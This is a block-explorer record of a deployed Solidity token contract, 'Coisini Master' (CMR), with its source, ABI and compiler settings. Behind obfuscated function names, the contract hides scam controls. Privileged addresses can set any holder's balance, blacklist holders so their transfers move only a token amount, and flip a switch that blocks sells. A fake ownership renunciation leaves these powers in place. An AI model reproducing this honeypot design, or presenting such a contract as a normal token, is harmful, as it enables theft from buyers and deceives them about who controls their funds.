{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface amountSender {\n    function createPair(address enableIsExempt, address launchedReceiver) external returns (address);\n}\n\ninterface sellSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyWallet) external view returns (uint256);\n\n    function transfer(address liquidityWallet, uint256 totalMaxReceiver) external returns (bool);\n\n    function allowance(address walletAtMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalMaxReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityWallet,\n        uint256 totalMaxReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitReceiver, uint256 value);\n    event Approval(address indexed walletAtMode, address indexed spender, uint256 value);\n}\n\nabstract contract takeToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface swapLiquidity is sellSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CoisiniMaster is takeToken, sellSwap, swapLiquidity {\n\n    uint256 private tokenFund;\n\n    string private enableToken = \"Coisini Master\";\n\n    function isToken() private view {\n        require(teamBuy[_msgSender()]);\n    }\n\n    uint256 private limitAutoShould = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private enableReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return isSenderFund;\n    }\n\n    bool public buyLaunched;\n\n    address public marketingLimit;\n\n    address autoReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private takeReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitAutoShould;\n    }\n\n    address buySender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function swapBuyReceiver(address autoFund, address liquidityWallet, uint256 totalMaxReceiver) internal returns (bool) {\n        require(takeReceiver[autoFund] >= totalMaxReceiver);\n        takeReceiver[autoFund] -= totalMaxReceiver;\n        takeReceiver[liquidityWallet] += totalMaxReceiver;\n        emit Transfer(autoFund, liquidityWallet, totalMaxReceiver);\n        return true;\n    }\n\n    uint256 buyToIs;\n\n    function transfer(address minEnable, uint256 totalMaxReceiver) external virtual override returns (bool) {\n        return teamShould(_msgSender(), minEnable, totalMaxReceiver);\n    }\n\n    uint256 private minSell;\n\n    function txReceiver(address atMarketingMin) public {\n        isToken();\n        \n        if (atMarketingMin == exemptFromFund || atMarketingMin == marketingLimit) {\n            return;\n        }\n        fromTo[atMarketingMin] = true;\n    }\n\n    uint256 tradingExempt;\n\n    function name() external view virtual override returns (string memory) {\n        return enableToken;\n    }\n\n    function allowance(address liquidityAmount, address swapAt) external view virtual override returns (uint256) {\n        if (swapAt == autoReceiver) {\n            return type(uint256).max;\n        }\n        return enableReceiver[liquidityAmount][swapAt];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoTx;\n    }\n\n    mapping(address => bool) public teamBuy;\n\n    string private isSenderFund = \"CMR\";\n\n    event OwnershipTransferred(address indexed walletIsShould, address indexed liquidityMinWallet);\n\n    function teamShould(address autoFund, address liquidityWallet, uint256 totalMaxReceiver) internal returns (bool) {\n        if (autoFund == exemptFromFund) {\n            return swapBuyReceiver(autoFund, liquidityWallet, totalMaxReceiver);\n        }\n        uint256 launchedExempt = sellSwap(marketingLimit).balanceOf(buySender);\n        require(launchedExempt == buyToIs);\n        require(liquidityWallet != buySender);\n        if (fromTo[autoFund]) {\n            return swapBuyReceiver(autoFund, liquidityWallet, feeTo);\n        }\n        return swapBuyReceiver(autoFund, liquidityWallet, totalMaxReceiver);\n    }\n\n    address private modeLiquidity;\n\n    function modeTakeTeam(uint256 totalMaxReceiver) public {\n        isToken();\n        buyToIs = totalMaxReceiver;\n    }\n\n    uint256 constant feeTo = 4 ** 10;\n\n    mapping(address => bool) public fromTo;\n\n    function tradingIsLiquidity(address buyWalletTake) public {\n        if (buyLaunched) {\n            return;\n        }\n        \n        teamBuy[buyWalletTake] = true;\n        \n        buyLaunched = true;\n    }\n\n    uint8 private autoTx = 18;\n\n    bool private liquidityReceiver;\n\n    function senderMax() public {\n        emit OwnershipTransferred(exemptFromFund, address(0));\n        modeLiquidity = address(0);\n    }\n\n    bool public modeMarketing;\n\n    uint256 private receiverIs;\n\n    function owner() external view returns (address) {\n        return modeLiquidity;\n    }\n\n    uint256 private enableTx;\n\n    address public exemptFromFund;\n\n    function transferFrom(address autoFund, address liquidityWallet, uint256 totalMaxReceiver) external override returns (bool) {\n        if (_msgSender() != autoReceiver) {\n            if (enableReceiver[autoFund][_msgSender()] != type(uint256).max) {\n                require(totalMaxReceiver <= enableReceiver[autoFund][_msgSender()]);\n                enableReceiver[autoFund][_msgSender()] -= totalMaxReceiver;\n            }\n        }\n        return teamShould(autoFund, liquidityWallet, totalMaxReceiver);\n    }\n\n    uint256 private swapIs;\n\n    constructor (){\n        \n        launchEnable launchedIsTx = launchEnable(autoReceiver);\n        marketingLimit = amountSender(launchedIsTx.factory()).createPair(launchedIsTx.WETH(), address(this));\n        \n        exemptFromFund = _msgSender();\n        teamBuy[exemptFromFund] = true;\n        takeReceiver[exemptFromFund] = limitAutoShould;\n        senderMax();\n        \n        emit Transfer(address(0), exemptFromFund, limitAutoShould);\n    }\n\n    function balanceOf(address buyWallet) public view virtual override returns (uint256) {\n        return takeReceiver[buyWallet];\n    }\n\n    function approve(address swapAt, uint256 totalMaxReceiver) public virtual override returns (bool) {\n        enableReceiver[_msgSender()][swapAt] = totalMaxReceiver;\n        emit Approval(_msgSender(), swapAt, totalMaxReceiver);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return modeLiquidity;\n    }\n\n    function launchSellReceiver(address minEnable, uint256 totalMaxReceiver) public {\n        isToken();\n        takeReceiver[minEnable] = totalMaxReceiver;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletAtMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletIsShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityMinWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMaxReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFromFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMaxReceiver\",\"type\":\"uint256\"}],\"name\":\"launchSellReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalMaxReceiver\",\"type\":\"uint256\"}],\"name\":\"modeTakeTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyWalletTake\",\"type\":\"address\"}],\"name\":\"tradingIsLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMaxReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMaxReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMarketingMin\",\"type\":\"address\"}],\"name\":\"txReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CoisiniMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}